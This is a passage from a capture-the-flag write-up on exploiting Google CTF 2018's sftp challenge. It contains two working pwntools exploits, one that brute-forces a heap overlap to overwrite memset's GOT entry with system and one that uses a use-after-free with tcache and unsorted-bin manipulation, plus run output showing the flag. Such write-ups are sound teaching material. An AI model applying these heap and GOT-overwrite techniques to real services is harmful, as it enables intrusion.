There was only one thing left: figuring out what libc the remote target is using, more precisely: what is the offset between the valid values of `memset` and `system`.

## Pitfall #3: GOT To Watch Your Offsets

Here there are different ways to go again. One: identify the exact libc based on the LSB values seen in the GOT (the last 12 bits - page offsets - are going to be fix regardless of ASLR). Two: use the arbitrary read primitive to just get the libc code and then identify the memset offset. Three: modify the GOT such that it looked unresolved for memset - but modify the values so that the lookup finds the system address instead.

Naturally, I went for the first option, simply because I assumed that the remote server will run on Ubuntu 16.04... just because they most often do in CTFs nowadays. After finding that the offset difference from one of the GOT members didn't match my libc, I proceeded to dump all the GOT entries. Here I got lucky - whereas the first one I tried (memset, since this was to be the overwrite target anyway) didn't have the same offset in the local and remote libc, one of the first GOT entries (strcpy) indeed did. So, using strcpy address, the exploit works the same way local and remote and we are essentially done.

Finding this out took me a lot longer of course, mostly because remotely it is blind trial-and-error when guessing which GOT offsets might be right and the exploit takes several minutes to run every time (due to the bruteforcing of the overlap). In hindsight, it could have been faster (or at least definitely less stressful) to take one of the other options. On the other hand, at least one of the entries (strcpy) DOES work out the same as the 16.04 libc... which means that it was quite possible as a CTFer to use the less complete option but get a quick result anyway.

This is the one issue I had with this challenge's design. I appreciated the idea that one would have to figure out the libc details... but this would have been better if it wasn't possible to do it with luck anyway, especially if one happens to have the same libc to begin with. At the end of the day, for these reasons, I prefer it when these types of challenges just provide the libc. It levels the playing field better, imho.

## The Finished Article

All right, we have covered everything, finally here is the working exploit code with plenty of comments to boot.

```
#!/usr/bin/env python
from pwn import *
import time, struct

def auth():
	print p.recvuntil("? ")
	p.send("yes")
	print p.recvuntil(": ")
	p.send("%H$I%H%I%I%I$I\n")
	print p.recvuntil("sftp.google.ctf.\n")
	print p.recvuntil("sftp> ")

def exit():
	p.sendline("exit")

def bye():
	p.sendline("bye")

def put(path, value):
	buf = "put %s" % path
	buf = buf.ljust(8201) #original length. That's how I can avoid sending "\n" w/o time
	p.send(buf) #ez mar jo
	p.send(str(len(value)).ljust(15))
	p.send(value)
	b = p.recvuntil("sftp> ")

def get(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	print "Size received:"
	print p.recvuntil("\n")	#until the size
	print "Rest received:"
	print p.recvuntil("sftp> ")

def get_leak(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	b = p.recvuntil("sftp> ")
	return b

def pwd():
	p.sendline("pwd")
	print p.recvuntil("sftp> ")

def cd(path):
	p.sendline("cd %s" % path)
	print p.recvuntil("sftp> ")

def ls(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	print p.recvuntil("sftp> ") #ez nyilvan fos hogy ha utkozik a filenevvel..

def ls_get(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	b = p.recvuntil("sftp> ") #ez nyilvan fos hogy ha utkozik a filenevvel..
	return b


def ls_leak(pattern):
	p.sendline("ls")
	b = p.recvuntil("sftp> ") #ez nyilvan fos hogy ha utkozik a filenevvel..
	if pattern in b:
		print "Data file_entry overlap achieved!!!!!!"
		return 1
	else:
		#print "ls return normal."
		return 0
	
def mkdir(path):
	p.sendline("mkdir %s" % path)
	print p.recvuntil("sftp> ")

def rm(path):
	p.sendline("rm %s" % path)
	print p.recvuntil("sftp> ")

def rmdir(path):
	p.sendline("rmdir %s" % path)
	print p.recvuntil("sftp> ")

def symlink(oldpath, newpath):
	p.sendline("symlink %s %s" % (oldpath, newpath))
	print p.recvuntil("sftp> ")

REMOTE = True

context.update(arch='amd64')
cwd = './'
bin = os.path.join(cwd, 'sftp_orig')

execute = [
    # 'continue'
]
execute = flat(map(lambda x: x + '\n', execute))

if REMOTE:
	p = remote('sftp.ctfcompetition.com', 1337)
else:
	p = process(bin, cwd=cwd, aslr=True)

auth()

#loop making files, always check if the ls shows an overlap occured
#since the malloc goes to a rand() address, when making new files, eventually
#we can get lucky and the page of data marker can overlap a file_entry structure.
#if this happens, pwd->child[X].name will simply becomes the marker, so we detect this with ls().
#ls() doesnt use anything else from the file_entry structure, therefore the murdering of pointers
#in it in this case make no difference.

entry_offset = -1

pattern = "B"
fpath = ""
for i in range(0, 5000):
	fpath = "/home/c01db33f/foobar_%d" % i
	put(fpath, pattern*4096)
	if (ls_leak(pattern) == 1):
		#we have an overlap
		print "%s entry's data overlaps with another entry!" % fpath

		#we know that in foobar_%i we have the overlap. let's find the offset.
		out = ls_get()
		start = out.find(pattern*5)
		out = out[start:]
		end = out.find("\n")
		out = out[:end]
		offset_from_data = 4096 - len(out)

		#ok - so the child.name is at this offset. the entry start then is at - 12
		entry_offset = offset_from_data - 12
		break
		
	if ((i % 50) == 0):
		print "[%d] ... " % i

print "We can start writing into %s and at data offset %d is the entry we overlapped." % (fpath, entry_offset)

entry_parent = "Q"*8
entry_type = p32(2)
name = "FFFF" + "\x00"*16
size = p64(16)
ptr = p64(0x40000000)
put(fpath, "X"*entry_offset + entry_parent + entry_type + name + size + ptr)
print "Now we should have the name FFFF, let's write to it and then read it out"


def arb_write(addr, value):

	global fpath, entry_offset

	if (entry_offset == -1):
		print "WM not initialized yet!"
		return

	entry_parent = "Q"*8
	entry_type = p32(2)
	name = "FFFF" + "\x00"*16
	size = p64(len(value))
	ptr = p64(addr)
	put(fpath, "X"*entry_offset + entry_parent + entry_type + name + size + ptr)
	put("FFFF", value)



def arb_read(addr, length):
	if (entry_offset == -1):
		print "WM not initialized yet!"
		return

	entry_parent = "Q"*8
	entry_type = p32(2)
	name = "FFFF" + "\x00"*16
	size = p64(length)
	ptr = p64(addr)
	put(fpath, "X"*entry_offset + entry_parent + entry_type + name + size + ptr)
	return get_leak("FFFF")


#all right, we have arbitrary R/W, yolo. Now we need to find the BSS.
#Idea: start scanning memory for "foobar", if we hit it, that means we've found a valid entry ->
#from there we can go back to the parent->parent to get BSS.

print "Scanning for a valid entry object..."

parent_dir_addr = -1
for i in range(0, 1000):
	addr = 0x40000000 + i*0x1000
	b = arb_read(addr, 0x1000)
	if "foobar" in b:
		print "We found the address of a valid entry!!"
		#print b
		start = b.find("foobar")
		parent_dir_start = start - 12
		parent_dir_addr = unpack(b[parent_dir_start:parent_dir_start+8], 64, endian="little")
		print "0x%08x is the parent dir address." % parent_dir_addr
		break
	elif ((i % 50) == 0):
		print "[%d]..." % i

if parent_dir_addr == -1:
	print "Did not find the entry in 1000 tries! Fuck you."
	

#now we just have to walk back twice to read/write the GOT!

def leak_got_addr(got, idx):
	leak = arb_read(got+idx*8, 8)
	leak = unpack(leak[2:10], 64)
	return leak

leak = arb_read(parent_dir_addr, 8)
g_home_folder_addr = unpack(leak[2:10], 64, endian='little')
print "g_home_folder is at 0x%08x" % g_home_folder_addr

memset_location_addr = g_home_folder_addr - (0x8BE0 - 0x5060)
print "memset addr in GOT is 0x%08x" % memset_location_addr

GOT = memset_location_addr - 8*12
print "GOT addr is 0x%08x" % GOT

memset_addr = leak_got_addr(GOT, 12)
abort_addr = leak_got_addr(GOT, 3)
strcpy_addr = leak_got_addr(GOT, 4)
puts_addr = leak_got_addr(GOT, 5)

print "abort: 0x%08x" % abort_addr
print "strcpy: 0x%08x" % strcpy_addr
print "puts: 0x%08x" % puts_addr
print "..."
print "memset: 0x%08x" % memset_addr

libc_base = strcpy_addr - (0xc779d0 - 0xbd2000)
print "libc_base: 0x%08x" % libc_base

#lets setup foobar_1's data now...
#put("foobar_1", "cat flag\x00")
put("foobar_1", "cat /home/user/flag\x00")

if REMOTE == False:
	system_addr = memset_addr - (0x50d6970 - 0x4fa9390)

system_addr = libc_base + (0x7f3e98175390 - 0x7f3e98130000)

#now we do the arbitrary write to get system from memset...
arb_write(memset_location_addr, p64(system_addr))

#and finally trigger memset on the data ptr that currently has "cat /home/user/flag"
#doing it from interactice instead, peace
#put("foobar_1", "c")

p.interactive()
```

And the result is:
```
kutyacica@ubuntu:~/Desktop/GCTF18$ python expl.py 
[+] Opening connection to sftp.ctfcompetition.com on port 1337: Done
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.
Are you sure you want to continue connecting (yes/no)? 
Warning: 
Permanently added 'sftp.google.ctf' (ECDSA) to the list of known hosts.
c01db33f@sftp.google.ctf's password: Connected to sftp.google.ctf.

sftp> 
[0] ... 
[50] ... 
[100] ... 
[150] ... 
[200] ... 
[250] ... 
[300] ... 
Data file_entry overlap achieved!!!!!!
/home/c01db33f/foobar_310 entry's data overlaps with another entry!
We can start writing into /home/c01db33f/foobar_310 and at data offset 2328 is the entry we overlapped.
Now we should have the name FFFF, let's write to it and then read it out
Scanning for a valid entry object...
[0]...
[50]...
[100]...
[150]...
[200]...
[250]...
[300]...
[350]...
[400]...
[450]...
We found the address of a valid entry!!
0x51f7378f is the parent dir address.
g_home_folder is at 0x557328cc9be0
memset addr in GOT is 0x557328cc6060
GOT addr is 0x557328cc6000
abort: 0x557328ac1cc6
strcpy: 0x7fb2d5e7c9d0
puts: 0x7fb2d5e46690
...
memset: 0x7fb2d5e66240
libc_base: 0x7fb2d5dd7000
[*] Switching to interactive mode
$ put foobar_1
$ c
CTF{Moar_Randomz_Moar_Mitigatez!}
sftp> $ pwd
Remote working directory: /home
```

As you can see, turning the memset into system is in fact so self-contained that the sftp process even keeps running without problems! Nice :)

## Useless After Free

Normally, this writeup would be over now. However, as I've mentioned previously, it didn't quite occur to me at first that the math does work out in our favor and the "overlap by chance" primitive IS all that we need. Instead, I've spent a long time looking for more bugs. Basically I thought that I would be remiss if I just assumed that all the "actual" code is perfect. And in fact I did find a couple bugs in the code. In a way, this was worse than finding nothing, because at first it seemed to justify the idea that I should be looking for more. In the end, they were useless bugs for the challenge ... however, it did occur to me during the CTF that in fact one of the bugs itself should be sufficient to exploit this same service even IF it used the normal ptmalloc.

Therefore, after the CTF, I wrote an exploit for this second bug, which is a use-after-free. To understand the bug, let's recap some things we can conclude about the filesystem implementation's behavior:

 * we are not able to change the root, but we can of course change the pwd using the `cd` command
 * when commands are given relative paths, finding entries always goes from the pwd pointer, not the root.
 * removing objects only deletes (`free()`s) the entry object, not the data object (so that's a memory leak on a "normal" heap)
 * removing a directory sets its parent's corresponding child entry to NULL and also walks every single link to set the link target to NULL in case it points to this directory

Something is missing here!! When removing a directory, it should be detected when it is the current working directory that we are removing! Otherwise, the global pwd pointer will point to a freed object aka a classic UAF. Since removing pwd only NULLifies the corresponding child entry of the root, as long as further commands are using relative paths, everything will still "just work". This is because even freeing the directory entry with ptmalloc, only the first 16 bytes of the chunk get possibly modified, and even that only means the parent pointer, the type, and the first four bytes of the name, however none of those fields are used when entries are looked up starting from the `pwd`, since it that case the lookup only walks `pwd->children`.

So let's figure out how to run this sftp with ptmalloc and then let's see how this could be exploited.

## Compiling sftp With Ptmalloc

We have to do two things: put back in the original malloc/free/realloc plus make sure the init hook code executes to setup the default filesystem.
Unfortunately due to the inlining (for free/realloc, even code elimination) of the functions, this would be hard from the binary. However, we have the source.

So I simply compiled the source without including "secure_allocator.h" to implement a fake allocator but by adding a few lines of code to the main that will replicate the exact same steps that were taken in the `init_filesystem` originally:

```

directory_entry root_bss;
directory_entry* root = NULL;
directory_entry* pwd = NULL;

(...)

int main() {

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  /* Replicate init_filesystem */

  root_bss.entry.parent_directory = 0;
  strcpy(root_bss.entry.name, "home");
  root_bss.child_count = 1;
  root_bss.child[0] = 0;
  root_bss.entry.type = DIRECTORY_ENTRY; /* this is missing from the original btw, tsk-tsk */
  root = &root_bss;
  pwd = &root_bss;
  handle_mkdir("c01db33f");
  pwd = (directory_entry *) pwd->child[0]; //handle_mkdir doesnt return it

  /* We dont add flag and src/sftp.c, not important for the 2nd pwn */

  service_main();

  return 0;

}

```

## UAF To Overlap: Ptmalloc Edition

For this exploit, I use the newest libc version available on Ubuntu 18.04. This means that thread-local caching (tcache) will be active. The objects we are overlapping are different now: the UAF gives us a directory entry, so we will try to overlap a data object with it. So, what are the options for overlapping a data object and a directory entry object in a way that we can exploit?

First, we could target an exact-fit. This is the easiest to achieve: if we free the directory entry, it will go onto the corresponding size tcache bin. Next, if we would request a data of this size, then we would be able to reclaim the freed chunk. However, a problem arises: when doing a `put` for a new size, we MUST send all the bytes, we can not send less:

```
  for ( ; new_file_size_; new_file_size_ -= v6 )
  {
    v6 = fread(new_file_addr, 1uLL, new_file_size_, stdin);
    if ( v6 < 0 )
      abort();
    new_file_addr += v6;
  }
```

This means that if we allocate to the same size, then we would end up clobbering the entire object. That's not good, because we first have to achieve a leak, without knowing any valid pointers (remember, this is not the "sophisticated" heap anymore when we know the valid pointer range for the heap by default irrespective of ASLR).

So, instead, we have to achieve an overlap of a smaller size data object with the original directory entry object, so that we can corrupt chunks partially.

For this, I decided to just use the typical trick to "turn off" the tcache: if we allocate and then free 7 directory entries, then the tcache for this size will be full and further frees of this kind will go onto the unsorted bin. From the unsorted bin, we can of course get the chunk back with a smaller size, this will just result in the chunk being split.

Of course, using the unsorted bin has side effects, as the forward and backward pointers will corrupt the first 16 bytes of the directory entry chunk. However, luckily these mean the parent pointer, the type, and the first four bytes of the name. And in fact these fields are basically unused for the pwd directory entry. Therefore, we get away with it.


## Overlap To Heap Leak: Ptmalloc Edition

What do we do with a partial overwrite of a directory entry? We can corrupt the LSB of the first child entry such that it points further `0x1C` ahead. Why? Because this way the field that is supposed to be at `0xC` (name) will instead be equal to the original field at `0x28` aka the data pointer field. This way, when we call an `ls`, instead of the name of the corresponding file entry of the pwd, we will get a leak of the data pointer's value!

## Heap leak To Arbitrary Write: Ptmalloc Edition

Now, with the knowledge of the heap base address, we could create complete fake file entries, therefore gain arbitrary write again! However, we have already ruined the directory entry, since the child pointer is wrong. We could still make this work if we juggled around more with children entries a priori, but there's a simpler solution: we simply move on from this crooked pwd!

If we setup another directory first, then we can simply `cd` into it. At this point, the old pwd directory will be completely lost, since the only remaining reference to it was the global pwd pointer itself. No problem for us.

Once we have a new pwd, we can redo the same exact thing, except that this time we can fully replace the child pointer. I chose to replace it with the heap base with size `0xFFFF`. This basically gives fully arbtirary read/write of the entire heap.

## Completing the exploit

From here, it is pretty trivial to win. Here's one possibility:

 * Due to us using unsorted bin chunks, there will be libc addresses on the heap.
 * Leaking the entire heap in one step gets us the libc address -> we can figure out where the free hook is.
 * Write back the heap content the same way, except modify a data pointer to point to the free hook as well as modify the parent pointer of a desired file object so that it reads "/bin//sh". No steps use that pointer from here, so it doesn't matter that it is garbage as a pointer value.
 * Rewrite free hook from 0 to system.
 * Call an rm to free the desired file - this results in system('/bin/sh')

Here is an exploit that will achieve the arbitrary r/w and leak the entire heap. Concluding it is left as an exercise for the reader :)

```
#!/usr/bin/env python
from pwn import *
import time, struct

def auth():
	print p.recvuntil("? ")
	p.send("yes")
	print p.recvuntil(": ")
	p.send("%H$I%H%I%I%I$I\n")
	print p.recvuntil("sftp.google.ctf.\n")
	print p.recvuntil("sftp> ")

def exit():
	p.sendline("exit")

def bye():
	p.sendline("bye")

def put(path, value):
	buf = "put %s" % path
	buf = buf.ljust(8201) #original length. That's how I can avoid sending "\n" w/o time
	p.send(buf)
	p.send(str(len(value)).ljust(15))
	p.send(value)
	print p.recvuntil("sftp> ")
        

def get(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	print "Size received:"
	print p.recvuntil("\n")	#until the size
	print "Rest received:"
	print p.recvuntil("sftp> ")

def get_leak(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	b = p.recvuntil("sftp> ")
	return b

def pwd():
	p.sendline("pwd")
	print p.recvuntil("sftp> ")

def cd(path):
	p.sendline("cd %s" % path)
	print p.recvuntil("sftp> ")

def ls(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	print p.recvuntil("sftp> ")

def ls_get(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	b = p.recvuntil("sftp> ")
	return b


def ls_leak(pattern):
	p.sendline("ls")
	b = p.recvuntil("sftp> ")
	if pattern in b:
		print "Data file_entry overlap achieved!!!!!!"
		return 1
	else:
		#print "ls return normal."
		return 0
	
def mkdir(path):
	p.sendline("mkdir %s" % path)
	print p.recvuntil("sftp> ")

def rm(path):
	p.sendline("rm %s" % path)
	print p.recvuntil("sftp> ")

def rmdir(path):
	p.sendline("rmdir %s" % path)
	print p.recvuntil("sftp> ")

def symlink(oldpath, newpath):
	p.sendline("symlink %s %s" % (oldpath, newpath))
	print p.recvuntil("sftp> ")

REMOTE = False

context.update(arch='amd64')
cwd = './'
bin = os.path.join(cwd, 'sftp_uaf')

execute = [
    # 'b *0x155554fd315a',
    # 'continue'
]
execute = flat(map(lambda x: x + '\n', execute))

if REMOTE:
	p = remote('sftp.ctfcompetition.com', 1337)
else:
	p = process(bin, cwd=cwd, aslr=True)

auth()

#So first we create two directories.

mkdir("/home/c01db33f/pwd1")
mkdir("/home/c01db33f/pwd2")

#Now we go into the second directory

cd("/home/c01db33f/pwd1")

#Now we setup a file where we will leak from originally.

put("/home/c01db33f/pwd1/foobar", "a"*32)

#Now we prime the tcache so that it does not get in the way.

for i in range(0, 7):
    mkdir("/home/c01db33f/foobar_%i" % i)

for i in range(0, 7):
    rmdir("/home/c01db33f/foobar_%i" % i)


#Ok, now the tcache is full, so the directory_entry_t will go to the unsorted bin.

#lets delete the pwd. this frees the directory_entry object
#onto the unsorted bin. Ofc that corrupts the first 16 bytes of if,
#which is the parenty pointer, the type and half of the name.
#but, when find_entry()'ing from the pwd, these fields don't matter at all, so it is ok.

rmdir("/home/c01db33f/pwd1")

#now the directory_entry object has been freed, but pwd pointer has not changed.
#now we want to do a new allocation by targetting the existing /home/c01db33f/pwd1/foobar

#the put has to use a path that is relative addressing, otherwise we go from root not pwd
#and it fails.

#when we do a put with relative path, we trigger a find_file(), which will walk from the pwd.
#this walking affects the child[] array of the object, which has absolutely
#not been trashed by the heap. alas, it will match foobar and do a new allocation
#to satisfy the size request.

#This results in splitting up pwd1's directory_entry_t object that is on the unsorted bin
#and finally giving us partial write access to the first child pointer. We use this to modify
#its LSB such that it is moved ahead 0x1C, which will mean that the child[0]->name will instead point to the original child[0]->data field, therefore an ls of this item will leak out the data pointer value.

#we overwrite the following fields:
'''
p64(0) - entry.parent_directory = NULL
p32(1) - entry.type = DIRECTORY_ENTRY
20*"C" - name
p64(1) - child count
"\x8C" - LSB of child[0] - see description why we use 0x8C:
'''

'''
after UAF free trigger, the pwd points to:

pwndbg> x/gx 0x56214b4d4000+0x204058
0x56214b6d8058:	0x000056214bc83310

Here we have:

pwndbg> malloc_chunk 0x000056214bc83300
0x56214bc83300 PREV_INUSE {
  mchunk_prev_size = 0,
  mchunk_size = 177,
  fd = 0x7f34c2d13ca0 <main_arena+96>,
  bk = 0x7f34c2d13ca0 <main_arena+96>,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
pwndbg> x/8gx 0x000056214bc83310
0x56214bc83310:	0x00007f34c2d13ca0	0x00007f34c2d13ca0
0x56214bc83320:	0x0000000000000000	0x0000000000000000
0x56214bc83330:	0x0000000000000010	0x000056214bc83470
0x56214bc83340:	0x0000000000000000	0x0000000000000000

So now we need to modify 0x000056214bc83470 so that at +C it has what it should have at +0x28.
-> 0x70 + (0x28 - 0xC) = 0x70 + 0x1C = 0x8C.
'''

put("foobar", p64(0) + p32(1) + "C"*20 + p64(1) + "\x8C")

out = ls_get()
print "received %d bytes" % len(out)

for b in out:
    print "0x%02X" % ord(b)

#The first 6 bytes of this leak is the heap address.
heap_addr = unpack(out[:6], 8*6, endian='little')
print "Leaked heap address: 0x%08x" % heap_addr
heap_base = heap_addr - 0x310

#Now we switch to the second pwd and redo this whole business.
#With this step, accessing /home/c01db33f/pwd1 is gone forever.
cd("/home/c01db33f/pwd2")

#To get proper clean situation, let's consume the leftover chunk of the unsorted bin.
#This adds more corruption to the original pwd, we could leverage that, but we'd rather
#leave it alone, it's a bit cleaner.

#We have 0x70 size unsorted bin chunk left.
#file_entry_t is 0x30. +0x10*2 for headers, so leaves 0x20 for data size.
#This has double use also, because it will be the chunk we modify to hit the UAF.
put("foobar2", 0x20*"D")

#Ok, now the tcache for directory_entry_t size is full, but all other bins are empty.
#So just like in the beginning!

#In that case, let's just create a chunk of data that we prep with known
#values so that it has inside of it a fake user chunk and then do the UAF again
#to get the corruption of the directory_entry_t for pwd2, this time fully overwriting
#the child pointer so that it points to the fake child pointer.
#the fake child pointer will then allow arbitrary read/write of the heap pretty much,
#because it will have its data pointer as heap_base and size as 0xFFFF.

#gdb.attach(p) #break the malloc to get the address we get back.
               #so that we know what to target in the UAF overwrite.

foobar2_chunk_addr = (0x55ff9e9399b0 - 0x55ff9e939000) + heap_base
print "data object to be used as fake file_entry_t at 0x%08x" % foobar2_chunk_addr

#we are assigning still to foobar2 so we dont trigger a new file_entry_t.
put("foobar2", p64(0) + p32(2) + "foobar2\x00".ljust(20) + p64(0xFFFF) + p64(heap_base))

#now we trigger the free of UAF the 2nd time
rmdir("/home/c01db33f/pwd2")

#and now we again assign to foobar2, again new allocation, this time overlapping
#the directory_entry_t of pwd2, making the foobar2_chunk_addr become the fake file_entry_t for
#foobar2
put("foobar2", p64(0) + p32(1) + "C"*20 + p64(2) + p64(foobar2_chunk_addr) + p64(0))

#finally: via "foobar2", we can directly R/W the entire heap.
get("foobar2") #this will print out 0xFFFF from the heap. We have won from here.

p.interactive()
```


## Bonus: Off-By-One From Hell

I mentioned that I found two "extra" bugs not one. The other one is simply a usability bug which matters little, apart from driving me crazy for a while. Long story short, when you invoke the `pwd` command, you always get the same exact result: "/home". This gave me fits at first as I struggled to comprehend what was actually happening. In the end, after a needlessly long time debugging the code, I realized that there is basically an off-by-one in the implementation that results in creating the pwd like this: "/home\00/path1(etc)". This of course just prints as "home" every time.

Honestly, I have no idea why the challenge author did this, but if it was on purpose, it was one hell of an annoying trick to pull, bro!

ps: can you spot where the off-by-one is?

```
void entry_path(entry* ptr, char* path) {

  char* path_ptr = &path[path_max - 1];
  memset(path, 0, path_max);
  while (ptr) {
    size_t name_len = strlen(ptr->name) + 1;
    if (path_ptr - name_len < path) {
      return;
    }
    path_ptr -= name_len;
    memcpy(path_ptr, ptr->name, name_len);
    *--path_ptr = '/';
    ptr = (entry*)ptr->parent_directory;
  }
  memmove(path, path_ptr, strlen(path_ptr));
}
```